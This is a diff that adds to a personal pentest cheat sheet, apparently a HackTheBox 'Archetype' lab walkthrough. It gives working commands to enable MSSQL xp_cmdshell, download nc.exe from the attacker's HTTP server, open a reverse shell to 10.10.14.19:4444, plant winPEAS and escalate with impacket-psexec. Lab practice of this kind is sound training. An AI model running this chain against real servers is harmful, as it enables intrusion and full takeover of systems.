@@ -49,6 +49,49 @@ database.
 SELECT * FROM {table_name}; : Prints out all the data from the table {table_name}.
 find intrestings data
 
+1433/tcp ms-sql-s
+login db
+impacket-mssqlclient {user id}@{ip} -windows-auth
+masuk admin
+SELECT is_srvrolemember('sysadmin');
+buka shell
+EXECUTE sp_configure 'show advanced options',1;
+RECONFIGURE;
+EXECUTE sp_configure 'xp_cmdshell',1;
+RECONFIGURE;
+tes shell
+xp_cmdshell "whoami"
+download https://github.com/int0x33/nc.exe/blob/master/nc.exe
+setup python server in the folder with the nc.exe
+python3 -m http.server
+find tun0 ip using ifconfig tun0
+get the file from system target
+xp_cmdshell "powershell.exe wget http://[Your_tun0_IP]:8000/nc.exe -OutFile c:\\Users\Public\\nc.exe"
+if it success this will show
+┌──(pandora㉿Dora)-[~/htb/archtype]
+└─$ python3 -m http.server                                                                                                                         
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.129.75.177 - - [25/Apr/2024 03:45:21] "GET /nc.exe HTTP/1.1" 200 -
+listen to port with netcat on different terminal
+nc -lvnp 4444
+run shell on target server
+xp_cmdshell "c:\\Users\Public\\nc.exe -e cmd.exe 10.10.14.19 4444"
+see the shell on listener terminal
+how to open root?
+using winpeas tool, download here https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe
+setup python server
+python3 -m http.server
+plant the winpeas in user target server with powershell 
+powershell
+wget http://10.10.14.19:8000/winPEASx64.exe -outfile winPEASx64.exe
+run winpeas ./winPEASx64.exe
+find admin credential
+after admin credential found, kill the powershell and mssqlclient
+use impacket-psexec tool to login administrator
+impacket-psexec administrator@{ip}
+now you are an admin
+
+
 80/tcp HTTP
 this mean IP avaiable in web browser and can perform web exploit hack.
 
